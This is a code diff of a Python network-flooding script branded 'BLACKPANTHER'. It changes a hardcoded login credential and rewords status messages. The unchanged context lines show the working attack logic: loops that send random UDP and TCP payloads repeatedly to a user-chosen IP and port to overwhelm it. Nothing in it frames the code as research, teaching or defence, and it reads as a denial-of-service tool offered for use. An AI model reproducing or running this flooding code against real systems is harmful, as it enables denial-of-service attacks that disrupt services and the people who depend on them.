@@ -46,7 +46,7 @@ while attemps < 100:
     username = input('Enter your username: ')
     password = input('Enter your password: ')
 
-    if username == 'n0l' and password == 'n0l':
+    if username == 'n0lk0ma' and password == 'n0lk0ma':
         print('You have successfully logged in Welcome to BLACKPANTHER!!')
         break
     else:
@@ -71,13 +71,13 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +  "\033[94mStatus Attack " +ip+ " \033[0m")
+			print(i +  "\033[94mRequest Attack  :. " +ip+ " \033[0m")
 		except:
 			print("[!] Error!")
 
 def run2():
 	data = random._urandom(999)
-	i = random.choice(("[×]"))
+	i = random.choice(("[x]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -85,7 +85,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +  "\033[31mAttack Start " +ip+ " \033[0m")
+			print(i +  "\033[31mStart Attack ::.." +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[+] Error!")
@@ -101,7 +101,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +  "\033[92mAttack Sent " +ip+ " \033[0m")
+			print(i +  "\033[92mStatus Sent :::..." +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[*] Error!")
@@ -117,7 +117,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +  "\033[91mAttack Status  " +ip+ " \033[0m")
+			print(i +  "\033[91mRequest Sent  ::::....  " +ip+ " \033[0m")
 		except:
 			s.close()
 			print("[+] Error!")
